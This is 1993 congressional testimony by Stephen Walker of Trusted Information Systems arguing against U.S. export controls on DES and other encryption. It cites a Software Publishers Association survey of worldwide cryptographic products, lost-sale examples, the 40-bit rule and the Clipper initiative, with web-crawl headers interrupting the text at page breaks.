The widespread availability of encryption products worldwide willmake it ever harder to decrypt the communications of adversarieswho do not want to be heard, with or without excessive exportcontrol measures. It is important to note that whether the U.S. Government dropsexport controls altogether on encryption products or attempts toimpose absolute restrictions even on domestic use of encryption,the task of law enforcement and the national security communityto listen in to our adversaries is going to get progressivelyharder day by day. Now Export Controls Are Harmful to the Nation Export controls served a useful purpose following World War IIand up to the early 1980s. They protected the Government'sinterests and did not interfere with the interests of privatecitizens and commerce. Since cryptography has become animportant tool for protecting the sensitive information ofeveryone, not just governments, and since the technology toimplement good quality cryptography has now become readilyavailable worldwide, export controls on good quality cryptographyare no longer needed and are highly detrimental to the interestsof the nation. HOW WIDESPREAD IS CRYPTOGRAPHY WORLDWIDE? Since the publication of the Data Encryption Standard as a U.S.Federal Information Processing Standard in 1977, cryptography hasshifted from the exclusive domain of governments to that ofindividuals and businesses. DES in both hardware and softwareimplementations is the de facto international standard againstwhich all other algorithms are measured. DES must be recertified as a FIPS every five years. In 1982, itwas recertified without controversy. In 1987-1988, NSArecommended against recertification except for specialized usesuch as banking, but the recertification proceeded. This yearthe recertification is before the Secretary of Commerce awaitingapproval. If approved, software implementations of DES will beallowed for the first time. DES was adopted by the U.S. and international banking communityshortly after its publication as a FIPS. The banking communityfought for and obtained the right to export DES for financialuses, primarily integrity checks but also for bankingconfidentiality uses, and the right to generate their own keyingmaterial (the random numbers that initialize theencryption/decryption processes) without relying on any otherGovernment agency. In the mid 1980s, DES was proposed as an international standardby the International Standards Organization (ISO) as DataEncryption Algorithm-1 (DEA-1). Final approval was not madebecause of an appeal by the U.S. suggesting that the ISO shouldnot approve any specific algorithms but leave that decision toindividual nations. The availability of DES and the controversy that arose as soon asit was published concerning whether it had weaknesses that NSAcould exploit fostered the highly fruitful academic research intopublic key cryptography in the late 1970s. Public key algorithmshave the major advantage that the sender does not need to haveestablished a previous secret key with the recipient for WT02-B11-302IA086-000618-B045-80http://res2.resnet.upenn.edu:80/cis590/reading.029.html 130.91.195.242 19970122054427 text/html 18118HTTP/1.0 200 OKDate: Wed, 22 Jan 1997 05:44:26 GMTServer: Apache/1.1.1Content-type: text/htmlContent-length: 17946Last-modified: Tue, 22 Nov 1994 06:31:10 GMTtestimony by Steve Walker on Export controls communications to begin. Public key algorithms such as RSA havebecome as popular and widely used as DES throughout the world forintegrity, confidentiality, and key management. SPA Study of Availability of Cryptography The Administration has asserted that export controls are notharming U.S. firms by causing them to lose market shares becausethere are no foreign products and programs available.Implementations of DES, RSA, and newer algorithms such as theInternational Data Encryption Algorithm (IDEA), an algorithm thathas a key length more than twice that of DES, are availableroutinely on the Internet from sites all over the world. Butaccording to the Administration, these do not count as commercialproducts. In order to develop a definitive assessment of just howwidespread cryptography is in the world, in May of this year, theSPA commissioned a study of products employing cryptography.There was a significant amount of knowledge about specificproducts here and there, but no one had ever tried to assemble acomprehensive database with, where possible, verification ofproduct availability. The SPA research team focused exclusively on products providingtext, file, and data communications encryption capabilities andon programs and products using DES or its equivalent, i.e., theprecise products subject to export restrictions. We did notinclude facsimile and voice encryption products. The teamobtained information from product literature, reference guides,industry surveys, trade press and journal articles, and responsesto requests for information from SPA members, cryptographyexperts, and information requests put on the Internet. Whenever possible, the team followed up information with requestsfor product literature. This was carefully scanned by at leasttwo independent project members, and the data was prepared forentry into the database. To the greatest extent possible, phonecalls have been made to vendors to clarify ambiguous technicalinformation. Information on new products continues to flow in daily but as ofOctober 12: o We have identified 264 foreign hardware, software, and combination products for text, file, and data encryption from 21 foreign countries: Argentina (1), Australia (18), Belgium (8), Canada (16), Denmark (14), Finland (1), France (5), Germany (33), Hong Kong (1), India (1), Ireland (1), Israel (10), Japan (2), the Netherlands (15), New Zealand (1), Norway (1), Russia (8), South Africa (7), Sweden (17), Switzerland (18), and the United Kingdom (86). o Of these 264 products, 123 employ DES. o We have confirmed the availability of 58 foreign encryption software programs and kits that employ the DES algorithm. These are published by companies in Australia, Belgium, Canada, Denmark, Finland, Germany, Israel, the Netherlands, Russia, Sweden, Switzerland, and the United Kingdom. We know some have distributors in other foreign countries and in the United States; one, a UK company, has distributors in 13 countries (Bahrain, Denmark, France, Greece, Ireland, Italy, Malta, the Netherlands, Norway, Singapore, Spain, Sweden, and Yugoslavia). One in Germany has distributors in 14 countries (Australia, Austria, Belgium, Canada, France, Italy, the Netherlands, Norway, Spain, Sweden, Switzerland, Turkey, the UK, and the U.S.). The programs are installed by the user inserting a floppy diskette; the kits enable encryption capabilities to be easily programmed into a variety of applications. A complete listing of all confirmed products in the database isidentified in Attachment 1. We have ordered and taken delivery on products containing DESfrom four countries: Denmark, Germany, Israel, and the UnitedKingdom. Foreign customers increasingly recognize and are responding tothe need to provide software-only encryption solutions. Althoughthe foreign encryption market is still heavily weighted towardsencryption hardware and hardware/software combinations, themarket trend is towards software for reasons of cost,convenience, and space. o On the domestic front, we have identified 288 products, of which 142 employ DES. Thus, at least, 142 products are unable to be exported, except in very limited circumstances, to compete with the many available foreign products. o In total, we have identified to date 552 cryptographic products, developed or distributed by a total of 366 companies (211 foreign, 155 domestic) in at least 33 countries. DES is also widely available on the Internet, and the recentlypopularized Pretty Good Privacy (PGP) encryption softwareprogram, which implements the IDEA, also is widely availablethroughout the world. The ineffectiveness of export controls is also evident in theirinability to stop the spread of technology through piracy. Thesoftware industry has a multibillion dollar worldwide problemwith software piracy. Mass market software is easy to duplicateand easy to ship via modem, suitcase, laptop, etc. Accordingly,domestic software products with encryption are easily availablefor export--through illegal but pervasive software piracy--toanyone who desires them. It cannot be any clearer: the existence of widespread andaffordable cryptographic products overseas is an indisputablefact. Based on that fact, unilateral U.S. export controls keepU.S. firms from competing in the global marketplace. Foreign customers who need data security now turn to foreignrather than U.S. sources to secure that need. As a result, theU.S. Government is succeeding only in crippling a vital Americanindustry's exporting ability. Following the first publication of the cryptographic database atthe Advisory Board meeting on June 2, the Administrationrequested a meeting with the SPA research team to review theirapproach and findings. This meeting was held on July 1, 1993, atthe Department of Commerce and involved Governmentrepresentatives from the Department of Commerce and NSA. Theteam described both their technique for gathering and catalogingthe information and the latest results. At the conclusion of themeeting, it appeared that the Administration representatives weresatisfied that a valid survey process was being carried out. At the second meeting of the Advisory Board on July 29, aGovernment representative of the Administration indicated thatthe mere availability of products overseas was not sufficient,that what was needed was an assessment of the market impact ofthose products. It is important to note to the contrary, though,that the Department of Commerce, in similar deliberations,requires only the demonstrated existence of foreign products, notan assessment of their market share. It would seem that nomatter how much information is acquired at what level of detail,the Administration will request more to delay further action. Nevertheless, the study begun in May by the SPA will continue tocollect additional information on cryptographic productavailability and to periodically publish its results to helpfocus attention on this important and often ignored situation.We would welcome Government participation in this ongoing effortto ensure the maximum coverage of available products and maximumutility to the Government. Frequently Heard Arguments One argument that is frequently heard to justify continued exportcontrols is that cryptographic products are not available outsidethe U.S. so U.S. software and hardware developers are not hurt byexport controls. The statistics from the SPA survey (264 foreignproducts, 123 using DES) prove that this argument is patentlyfalse! A second argument is that even if products are available, theycannot be purchased worldwide. This is also patently false! We have found 366 companies in 32 foreign countries and the U.S.that are manufacturing, marketing, and/or distributingcryptographic products, most on a worldwide basis. The names ofthese companies are listed in Attachment 2. A third argument frequently heard is that the products sold inother parts of the world are inferior to those available in theU.S. Again, the results of our survey show this to be patentlyfalse! We purchased products from several sources throughout the world.We ordered DES-based PC file encryption programs for shipmentusing routine channels from: o Algorithmic Research Limited (ARL), Israel o Sophos Ltd., UK o Cryptomathic A/S, Denmark o CEInfosys GmbH, Germany o uti-maco, Germany o Elias Ltd., Russia (distributed through EngRus Software International, UK) All the products we ordered were shipped to us in the U.S. withina few days. The German products were sent to us directly fromtheir U.S. distributors in Virginia and Connecticut,respectively. Our experience has been that if there is paperworkrequired by the governments in which these companies operate toapprove cryptographic exports, it is minimal and results inessentially immediate approval for shipping to friendlycountries. The products we obtained from these manufacturers anddistributors were in every case first rate implementations ofDES. To better understand if foreign products are somehowinferior, we tried to order the same Sophos product from theirBahrain distributor. We were informed by the distributor thatsince we were outside his area, he could not sell directly to us.He then told us that everything he sells is shipped directly fromthe manufacturer in England. The uti-maco U.S. distributor in Connecticut indicated that hecould ship us his German made product immediately (we received itthe next day), without needing any further approval from theGerman parent company or the German government. Apparently, theGermans have a form of blanket approval for sale to anyone in theU.S. I asked if that was true elsewhere in the world and therepresentative told me that while he dealt only in the U.S., hebelieved that this was true. We have no indication that products being shipped to the U.S. orthe rest of the world from foreign manufacturers or distributorsare in any way inferior to products available in the U.S. Others Use Different Rules But our survey results also point to a much more ominous finding!Apparently the controls imposed by the U.S. Government on exportof cryptographic products from the U.S. are far more restrictivethan those imposed by most other countries including our majorallies. The effect of this most unfortunate situation is tocripple U.S. industry while our friends overseas are essentiallyfree to export as they wish. The U.S. imposes very strict rules on the export of cryptographicproducts. In general, applications for the export of productsthat use DES will be denied even to friendly countries unlessthey are for financial uses or for U.S. subsidiaries. We havebeen told repeatedly by the U.S. Government that other countriessuch as the United Kingdom and Germany have the same exportrestrictions that the U.S. does. But our experiences with these purchases of cryptographicproducts show a very different picture. Companies in the UK, Germany, Denmark, and Israel can freely shipDES products to the U.S. and presumably elsewhere in the worldwith no more then a few days of government export control delay,if any. The claim is they have to "fill out some papers," butit's no big problem. Based on our experiences to date, I conjecture that thesecountries are using CoCom (the Coordinating Committee of westernnations and Japan) rules for determining where to allow exports.If this conjecture is true, most countries in the free world canreadily receive exports from these countries. I speculate thatcompanies in these countries are required to fill out exportforms but if they can show that the destination country is notproscribed by CoCom or their local equivalent, they can shipwithout waiting for further government approval. Everyexperience we have had supports this supposition. Whether my theory is correct or not, our experience with thesepurchases has demonstrated conclusively that U.S. business is ata severe disadvantage in attempting to sell products to the worldmarket. If our competitors overseas can routinely ship to mostplaces in the world within days and we must go though timeconsuming and onerous procedures with the most likely outcomebeing denial of the export request, we might as well not eventry. And that is exactly what many U.S. companies have decided. And please be certain to understand that we are not talking abouta few isolated products involving encryption. More and more weare talking about major information processing applications likedatabases, electronic mail packages, and integrated softwaresystems that must use cryptography to provide even the most basiclevel of security being demanded by multinational companies. Demonstrations of Available Cryptographic Products We have before us today several examples of cryptographicproducts that were lawfully obtained in the United States fromforeign vendors: o AR DISKrete: produced by Algorithmic Research Limited (ARL), Israel. Uses DES disk/file encryption to provide PC security and access control. o EDS: produced by Sophos Ltd., UK. DES-based PC file encryption package. o F2F (File-to-File): produced by Cryptomathic A/S, Denmark. DES-based PC file encryption utility. o Softcrypt: produced by CEInfosys GmbH, Germany. DES-based PC file encryption utility. o SAFE-GUARD Easy: produced by uti-maco, Germany. DES-based PC file encryption utility. o EXCELLENCE for DOS: produced by Elias Ltd., Russia distributed through EngRus Software International, UK. GOST-based (Russian DES equivalent) PC file encryption utility. We also have a demonstration of the power of the digitalrevolution and the impact it will have on all our communicationsin the future. Traditionally, when we think of voicecommunications, we think of the telephone in its many forms(desk, cordless, cellular, car). However, many modern computerworkstations now have the ability to carry voice as well as othermultimedia communications. Routinely today on the Internet,voice conferences are held over packet switched communicationsnetworks. Today we have a demonstration using two workstations that comewith software to digitize voice communications, packetize it fortransmission over a network, and resynthesize it into perfectlygood (sometimes better than phone quality) voice. Systems likethese are being used daily for voice conferencing over networksaround the world. With this capability, it is straightforward to protect phoneconversations from eavesdroppers. Since all the capabilities areperformed in software, it is trivial to add an encryptionalgorithm, such as the Data Encryption Standard, to the softwareand provide good quality encryption to the digitized, packetizedspeech. Today we have DES versions from Finland, Sweden,Australia, and the U.S. HOW IS U.S. INDUSTRY BEING AFFECTED BY EXPORT CONTROLS? TIS Experiences To begin this section, I would like to give several examples ofexperiences that my company has had recently in dealing with theexport control process. Trusted Information Systems is a member of the Internet communityand has implemented a version of the Internet Privacy EnhancedMail (PEM) system, which it is offering free to users on theInternet and for sale to commercial users under the name TrustedMailTM. Several hundred Internet users have retrieved the PEMsource code, and many of them are using it on a daily basis. Ourexperiences with PEM illustrate the variety of frustrations,confusion, and lost opportunities that confront U.S. businessesin the area of international cryptographic products. PEM is based on international Internet specifications developedover the past five years by a team of researchers from throughoutthe world. In its present version, PEM uses DES forconfidentiality and RSA for signature and key management. Assuch, it does not meet the U.S. Department of State requirementsfor export outside the U.S. or Canada. In order to establish a distribution system for PEM similar tothat of other software products on the Internet, TIS reviewedvarious techniques that universities and other companies haveused. The "anonymous FTP" approach, in which a user who does nothave an account is allowed to log on to the computer containingthe information and perform a file transfer of the specificprogram files, was considered the best choice. Such techniquesare routinely used throughout the Internet, but in the case ofsoftware that is subject to export controls, one must beconcerned that individuals outside the U.S. and Canada mayattempt to retrieve the programs. The problem is how to identifywhether someone who is anonymous is approved to retrieve thesoftware or not. As had been done earlier by others, we have created a "READ ME"file that the person seeking the software must read beforeretrieving the PEM program. The reader is cautioned that if heor she is not from the U.S. or Canada, it is against U.S. export WT02-B11-303IA086-000618-B045-128http://res2.resnet.upenn.edu:80/cis590/reading.030.html 130.91.195.242 19970122054450 text/html 18109HTTP/1.0 200 OKDate: Wed, 22 Jan 1997 05:44:52 GMTServer: Apache/1.1.1Content-type: text/htmlContent-length: 17937Last-modified: Tue, 22 Nov 1994 06:31:11 GMTtestimony by Steve Walker on Export controls law to proceed. The file name of the PEM programs contained inthe "READ ME" file is changed frequently to force the anonymoususer to read the export control caution. We also installedfilters that automatically refuse requests that are clearlycoming from outside the U.S. or Canada. But we know that thosefilters cannot stop inquiries from foreign sources that haveaccounts in the U.S. To the best of our knowledge, our approachis as sound as many that others are using and better than most. Before we put the system on line, though, we sought the approvalof the Department of State and the National Security Agency.Initially we got acknowledgements to our phone calls describingour problem and proposed solution. We were told orally at onetime that because the PEM software was "free," it was permissibleto proceed this way, implying that if we charged for it, somehowthis process would not be approved. But as we began to seekofficial approval for this process, we received fewer and fewerresponses. Our inquiries finally took the form of: "Unless youtell us not to do this, this is how we intend to proceed." OnJune 1, 1993, we put the anonymous FTP process on line, and oursystem has responded to hundreds of requests. We have neverreceived acknowledgement that the process is either acceptable orunacceptable to the Government despite being told on severaloccasions that we would receive such acknowledgement. The above described process is patterned after a similar processthat takes place now in software retail stores. Programs forsale over the counter containing DES or similar export controlledsoftware are supposed to be marked with explicit and obviouslabels telling the buyer that these products cannot be taken fromthe U.S. or Canada. The burden of complying with the export lawsrests entirely with the buyer since the seller has noresponsibility to ascertain whether the buyer is a U.S. orCanadian citizen. One has to wonder if these prominent notices,rather than advising buyers to beware, do not guide the foreignbuyer, who is not concerned with violating U.S. export laws,directly to the product he or she wishes to buy. A second situation of interest involves a potential majorcustomer of PEM, the British Ministry of Defence (MoD). Forseveral years, TIS has been discussing PEM with officials in theMoD for use with unclassified information among MoD users andtheir industrial suppliers. TIS has a perfectly good solution toMoD's problems and could have had it running there years ago.Unfortunately, we cannot export PEM even to the British MoDbecause PEM uses the DES and RSA encryption algorithms. Last year, the SPA succeeded in obtaining expedited exportapproval for software products that use cryptography so long asthe key length is 40 bits or less. While this was a significantaccomplishment, since it was the first time that any cryptographyfor confidentiality was given general export approval, thevictory was short lived. Forty-bit key algorithms can beexhaustively searched in very short times. If a device could bebuilt to exhaustively search a 56-bit key space (DES) in 176years, it would take less than 1 day to search a 40-bit keyspace. Foreign customers for U.S. products who already have DESreadily available laughed at the 40-bit U.S. restriction. TISproduced a 40-bit version of Trusted Mail and obtained theexpedited Department of State export approval but to date hasbeen unable to find a foreign (or domestic) customer willing toaccept the weak 40-bit key length. After spending much energy searching for plausible solutions tothis problem, our newly formed Trusted Information Systems (UK)Limited office has contracted with British scientists toimplement a new UK version of PEM based on the same internationalspecifications and using DES and RSA algorithms that are alreadyavailable in the UK. In a very real sense, this situationdemonstrates that the only accomplishment of U.S. export controlrestrictions is the export of U.S. jobs. To make matters even worse (in the job export sense, at least),because of provisions in the UK export laws, it appears that wecan import the UK product for sale in the U.S., something wewould never be able to do in reverse. These examples of problems with the export control process or itsconsequences are typical of the situations many U.S. companiesfind as they attempt to enter the world of software cryptography. Industrywide Experiences Some companies do try to compete and offer excellent DES-basedproducts in the U.S. But because of the export restrictions,they must develop weaker versions for export if they wish topursue foreign markets. Many companies forgo the business ratherthan spend extra money to develop another inferior product thatcannot compete with products widely available in the market. The Government already has a measure of lost sales anddissatisfied customers in the number of State Department/NSAexport license applications denied, modified, or withdrawn.However, it is impossible to estimate accurately the full extentof lost sales. Many potential customers know that U.S. companiescannot meet their demand and thus no longer inquire. Conversely,some companies have given up even trying to get export approvalsfor DES to meet customer demand. Gauging the extent of economic harm to companies is an inherentlydifficult task because most companies do not want to reveal thatsort of information. Consequently, there exists only anecdotalinformation. But the accumulation of anecdotal informationcollected by the SPA paints a picture of three ways in which theexport controls on cryptographic products are hurting Americanhigh-tech industry. (1) First, for many data security companies, every sale isvital, and the loss of contracts smaller than $1 million canoften mean the difference between life and death for thesecompanies. The confusion and uncertainty associated with exportcontrols on encryption generate severe problems for small firms,but not as severe as the loss of business they suffer from anti-competitive export controls. Examples abound: o One U.S. company reported loss of revenues equal to a third of its current total revenues because export controls on DES-based encryption closed off a market when its customer, a foreign government, privatized the function for which the encryption was used, and the U.S. company was not permitted to sell to the private foreign firm. The company estimates it loses millions of dollars a year because it receives substantial orders every month from various European customers but cannot fill them because of export controls. o One small firm could not sell to a European company because that company sold to clients other than financial institutions (for which export controls grant an exception). Later, the software firm received reports of sales of pirated copies of its software. This constituted a loss of a $400,000 contract for the small U.S. software firm. o Because of existing export restrictions, an American company recently found itself unable to export a mass market software program that provided encryption using Canadian technology based on a Japanese algorithm. Yet other European and Japanese companies are selling competing products worldwide using the same Canadian technology. o An SPA member's product manager in Europe reported the likely loss of at least 50% of its business among European financial institutions, defense industries, telecommunications companies, and government agencies if present restrictions on key size are not lifted. o Yet another SPA member company reported the potential loss of a substantial portion of its international business if it cannot commit to provide DES in its programs. o A German firm that opened a subsidiary in the U.S. sought a single source encryption software product for both its German and U.S. sites. A U.S. data security firm that bid for the contract lost the business because U.S. export controls required that the German firm would have to wait approximately six months while a license was processed to sell them software with encryption for foreign application. The license could only be for one to three years, the three year license being more expensive. Consequently, the German firm ended up purchasing a DES-based system from another German company, and the U.S. firm lost the business. o A foreign government selected one software company's data security product as that government's security standard. The company's application to export the DES version was denied, and as a consequence the order was lost. This cost the company a $400,000 order and untold millions in future business. (2) Second, multinational corporations (MNCs) are a prime sourceof business in the expanding international market for encryptionproducts. Many U.S.-based firms have foreign subsidiaries oroperations that do not meet export requirements. While U.S.products may be competitive in the U.S., many MNCs obtain fromforeign sources encryption systems that will be compatible withthe company's worldwide operations. Moreover, foreign MNCscannot rely on the availability of U.S. products and have beenknown to import foreign cryptography for use in their U.S.operations. o One U.S. firm reports the loss of business from foreign MNCs that will not integrate the company's products into their U.S. operations because of the export restrictions that would prevent them from being compatible with their domestic operations. o The Computer Business Equipment Manufacturers Association reports that one of its members was denied an export license and lost a $60 million sale of network controllers and software for encryption of financial transactions when the Western European customer could not ensure that encryption would be limited to financial transactions. (3) Third, encryption systems are frequently sold as a componentof a larger system. These "leveraged" sales offer encryption asa vital component of a broad system. Yet the encryption featureis the primary feature for determining exportability. Because ofthe export restrictions, U.S. firms are losing the business notjust for the encryption product but for the entire system becauseof the restrictions on one component of it. o One data security firm has estimated that export restrictions constrain its market opportunities by two- thirds. Despite its superior system, it has been unable to respond to requests from NATO, the Swedish PTT, and British telecommunications companies because it cannot export the encryption they demand. This has cost the company millions in foregone business. o One major computer company lost two sales in Western Europe within the last 12 months totaling approximately $80 million because the file and data encryption in the integrated system was not exportable. One possible solution to the problem of export controls may befor U.S. companies to relocate overseas. Some U.S. firms haveconsidered moving their operations overseas and developing theirtechnology there to avoid U.S. export restrictions. Thus, when aU.S. company with technology that is clearly in demand is keptfrom exporting that technology, it may be forced to export jobsinstead. HOW ARE U.S. CITIZENS AND BUSINESSES BEING AFFECTED BY ALL THIS? The answer to this question is painfully simple. When U.S.industry forgoes the opportunity to produce products thatintegrate good security practices, such as cryptography, intotheir products because they cannot export those products to theiroverseas markets, U.S. users (individuals, companies, andGovernment agencies) are denied access to the basic tools theyneed to protect their own sensitive information. This is wherethe greatest frustration sets in. The U.S. Government established export controls in order to keepgood quality cryptography from proliferating outside the U.S.The result has been exactly the opposite effect. Good qualitycryptography is now available everywhere in the world includingthe U.S. But U.S. customers cannot buy it integrated into theinformation system products they normally use because U.S. exportlaws discourage U.S. suppliers from developing such products. We seem caught in a vicious circle that appears to make senseonly to those who do not want to see good quality cryptographyused anywhere. WHAT EFFECT WILL CLIPPER HAVE? In the midst of all of this, on April 16, 1993, the Presidentannounced the Clipper initiative to ensure the public's right toprivacy while allowing law enforcement to conduct lawfulwiretaps. The principal concern of many with Clipper is the potential ithas for violating the privacy of citizens. In his April 16announcement, the President stated that "The Administration iscommitted to policies that protect all Americans' right toprivacy while also protecting them from those who break the law."It would appear that the only way both aspects of this policy canbe carried out is if the individual's right to privacy issuperseded by the Government's right to listen in whenever theGovernment chooses. Many people fear that this isn't much of aright to privacy. There are many other concerns that have been expressed about theAdministration's Clipper Initiative and the negative aspects ofkey escrow. But with respect to the issue of export restrictionson software products, Clipper represents primarily a distractiononly serving to cloud the issues. Unless Clipper is mademandatory, its requirement to use hardware and its key escrowprovisions will cause it to have little impact on the softwaremarket. No one will willingly give up the convenience ofintegrated software encryption for an expensive hardware box thatwill let the Government listen in. The international aspects of Clipper are not at all thought out.Even if Clipper were exportable, the fact that the U.S.Government will hold the keys and not share them with othergovernments ensures that this will be no more successful overseasthan the 40-bit key length "solution." Clipper is a major diversion that does not solve any of theproblems discussed above. WHAT CAN BE DONE? Many Calls for Action Many people have been clamoring about the need to relax exportcontrols on encryption for years. The National Research Councilhas recently issued four reports expressing serious concern inthis area (Attachment 3). The computer industry has been complaining ever more loudly forten years. The Congressionally chartered Computer System Security andPrivacy Advisory Board has called for a national review of theseissues involving Government (civilian, law enforcement, andnational security interests) and industry (users and vendors).The Advisory Board passed resolutions on the need for a nationalreview and expressing serious concerns about the ClipperInitiative (Attachment 4). The Administration has formed an Interagency Review at therequest of the President to look at all aspects of thecryptography issue including export control. This review is thehighest level investigation of this problem to date. Its reportis due out any time, within days or weeks. Unfortunately, thereview is being conducted from behind closed doors with the onlypublic input coming through the auspices of the Advisory Boardand such industry groups as the Digital Privacy and SecurityWorking Group. Since the Interagency review began with the Clipper announcementand is being conducted by Government officials who are heavilycommitted to Clipper, it is unlikely that its results will assistbusiness by easing the software cryptography export controlconstraints. President Clinton, in commenting on the North American Free TradeAgreement, was quoted by the Washington Post, September 16, 1993,as saying: I'm telling you folks, we cannot repeal the force that is driving the world economy together. We can run away from it and get beat by it, or we can embrace it, do what we have to do and win with it. If only those who control cryptographic exports understood this. On September 30, the President announced a significant relaxationof the export control rules for high performance computertechnology. It would be good if some of that change could affectthe cryptography export area, but the present export position isso well entrenched, it is unlikely there will be much change fromthe Executive Branch. The Congress Must Act Now! The only hope for a recognition of the counterproductive natureof this situation is in the Congress. No other organization hasthe breadth of constituencies to allow an honest look at all theconcerns and the authority to come to a definitive resolution onthe issue. We need to recognize that the U.S. public has a right to areasonable level of protection for its sensitive information.Enabling that right through allowing the export of good quality WT02-B11-304IA086-000618-B045-182http://res2.resnet.upenn.edu:80/cis590/reading.031.html 130.91.195.242 19970122054525 text/html 18081HTTP/1.0 200 OKDate: Wed, 22 Jan 1997 05:45:22 GMTServer: Apache/1.1.1Content-type: text/htmlContent-length: 17909Last-modified: Tue, 22 Nov 1994 06:31:12 GMTtestimony by Steve Walker on Export controls cryptography such as DES will not harm the intelligence gatheringcapabilities of this country any more than the worldwideproliferation of cryptography already has. I strongly encourage this Subcommittee to press as vigorously aspossible for legislation that will allow the export of goodquality cryptography so that our industry will implement it andour citizens can use it! MY ORAL TESTIMONY ORAL TESTIMONY BY STEPHEN T. WALKER PRESIDENT TRUSTED INFORMATION SYSTEMS, INC. FOR SUBCOMMITTEE ON ECONOMIC POLICY, TRADE AND ENVIRONMENT COMMITTEE ON FOREIGN AFFAIRS U.S. HOUSE OF REPRESENTATIVES OCTOBER 12, 1993 Good Afternoon. I am pleased to testify today about the negativeimpact that U.S. export control regulations are having on one ofthe few industries where the U.S. remains dominant worldwide, theinformation system software industry. My name is Steve Walker. I am the founder and President ofTrusted Information Systems (TIS), Inc., a ten year old smallbusiness with offices around the U.S. and in England,specializing in research, product development, and consulting ininformation security. I am also here representing the SoftwarePublishers Association (SPA) and its members on this mostimportant topic. The SPA is the principal trade association of the personalcomputer software industry. Since 1984, it has grown to over1,000 members, representing the leading publishers in thebusiness, consumer, and education software markets. My background includes twenty two years with the Department ofDefense, at the National Security Agency, the Defense AdvancedResearch Projects Agency, and the Office of the Secretary ofDefense. My last job with the Government was as Director ofInformation Systems for the Assistant Secretary of Defense forCommunications, Command, Control, and Intelligence (C3I). I have been a member of the Computer System Security and PrivacyAdvisory Board (CSSPAB), chartered by the Computer Security Actof 1987, throughout its many deliberations on cryptography. My written testimony describes the national dilemma between, onthe one hand, the interests of law enforcement and nationalsecurity to limit the availability of good quality cryptographyso they can continue to listen in to our adversaries and, on theother hand, the rapidly growing interests worldwide ofindividuals and businesses to protect their sensitiveinformation. The tension between these forces has been building for years andis reaching crisis stage. But the arguments on both sides havebeen mostly gloomy predictions of disaster: from the Governmentif we were to open up exports of cryptography, and from industryif we don't. I am very pleased today to be able present some concrete evidencethat may begin to move this debate from a war of words to thecareful analysis of factual information that is so badly needed. SPA Survey of Available Cryptography In May 1993, the SPA chartered a survey of the worldwideavailability of good quality cryptography. The findings to dateindicate that cryptography is available now to essentially anyonewho wants it. [PUT UP CHART 1 # SUMMARY] Within just five months of part-time effort by a few dedicatedpeople, we haveconfirmed product literature and in a few cases actual softwarefor 200 foreign products, 123 using the Data Encryption Standardalgorithm, the official U.S. and defacto worldwide encryptionstandard. We have leads that we are confirming on another 64foreign products, giving a total of 264 products developed andavailable outside the U.S. We have found manufacturers of cryptographic products in 21foreign countries and distributors of cryptographic products in33 countries throughout the world. [PUT UP DISTRIBUTORS MAP, EASEL 2] Most of the major countries of the western world are representedhere. In the course of the survey, we have also confirmed theavailability of 241 cryptographic products in the U.S., 142 usingDES, and we are attempting to confirm 47 others. Worldwide, wehave identified 552 products overall. The names and countries oforigin of these products are listed in Attachment 1 of mytestimony. We are continuing to find more products, manufacturers, anddistributors on a daily basis. We believe we have just scratchedthe surface. We have assembled a set of notebooks that contain the productdescriptions of all confirmed products in our database. We alsohave some of the sources of the information we have used to findthese products. In addition, we have several of the productsthat we have purchased to confirm that good quality cryptographyis indeed available worldwide. Frequently Heard Arguments There are a series of arguments that are frequently heard fromthose who wish to justify continued export controls. The first one is, "Cryptographic products are not availableoutside the U.S. so U.S. software and hardware developers are nothurt by export controls." We believe our survey results havealready proven that statement to be patently false! A second argument is, "Even if cryptographic products areavailable, they cannot be purchased worldwide." Our surveyresults show that this is also patently false! We have found 366 companies in 32 foreign countries and the U.S.that are manufacturing, marketing, and/or distributingcryptographic products, most on a worldwide basis. The names ofthese companies are listed in Attachment 2 of my testimony. A third argument frequently heard is, "Even if the products areavailable and can be purchased easily, those sold in other partsof the world are somehow inferior to the products available inthe U.S." To the contrary, the results of our survey show thatforeign products are just as good and in many cases better thanmany U.S. products. We purchased products from several sources throughout the world.We ordered DES-based PC file encryption programs for shipment tothe U.S. from: o Algorithmic Research Limited, of Israel o Sophos, Ltd, of the United Kingdom o Cryptomathic A/S, of Denmark o CE Infosys Gmbh, of Germany o uti-maco, of Germany We also obtained a similar product from: o Elias Ltd., of Moscow, Russia (distributed through EngRus Software International, UK. This product uses GOST, the Russian equivalent of DES.) All the products we ordered were shipped to us in the U.S. withina few days. The German products were sent to us directly fromtheir U.S. distributors in Virginia and Connecticut,respectively. Our experience has been that if there is exportapproval paperwork required by the governments of thesecompanies, it is minimal and results in essentially immediateapproval for shipping to friendly countries. The products we obtained from these manufacturers anddistributors were in every case first rate implementations ofDES. To better understand if good products were being shipped tothe U.S. and inferior products being sold overseas, we orderedthe same Sophos product that we already had from their Bahraindistributor. We were told by the distributor that everything hesells is shipped directly from the manufacturer in England. The uti-maco U.S. distributor in Connecticut shipped us hisGerman made product within a day and without needing any furtherapproval from the German parent company or the German government.Apparently, they have some form of blanket approval for sale toanyone here. I asked if that was true elsewhere in the world andthe representative told me, while he dealt only in the U.S., hebelieved that this was the case. We have no indication that products being shipped to the U.S. orthe rest of the world from foreign manufacturers or distributorsare in any way inferior to products available in the U.S. In many cases the products have proven to be of superior quality,easily comparable with U.S. products. Others Use Different Rules But our survey results also point to a much more ominous finding! Apparently the controls imposed by the U.S. Government on exportof cryptographic products from the U.S. are far more restrictivethan those imposed by most other countries including our majorallies. The effect of this most unfortunate situation is tocripple U.S. industry while our friends overseas are essentiallyfree to export as they wish. The U.S. imposes very strict rules on the export of cryptographicproducts. In general, applications for the export of productsthat use DES will be denied even to friendly countries unlessthey are for financial uses or for U.S. subsidiaries. We havebeen told repeatedly by the U.S. Government that other countriessuch as the United Kingdom and Germany have the same exportrestrictions that the U.S. does. But our experiences with these purchases of cryptographicproducts show a very different picture. Companies in the UK, Germany, Denmark, and Israel can freely shipDES products to the U.S. and presumably elsewhere in the worldwith no more then a few days of government export control delay,if any. Based on our experiences to date, I conjecture that thesecountries are using CoCom (the Coordinating Committee of westernnations and Japan) rules for determining where to allow exports.[COCOM MAP, EASEL 3] [PUT UP COCOM MAP NOW] This chart illustrates in red the CoCom proscribed countries plusa set of terrorist countries. All of the countries in Green areapparently available for export with minimal restrictions. If this conjecture is true, it explains why these countries canreadily ship to most countries in the free world. I speculatethat companies in these countries may be required to fill outexport forms but if they can show that the destination country isnot proscribed by CoCom or their local equivalent, they can shipwithout waiting for further government approval. Every experience we have had with the survey supports thissupposition. If only this were true in the U.S.! Whether my theory is correct or not, our experience with thesepurchases has demonstrated 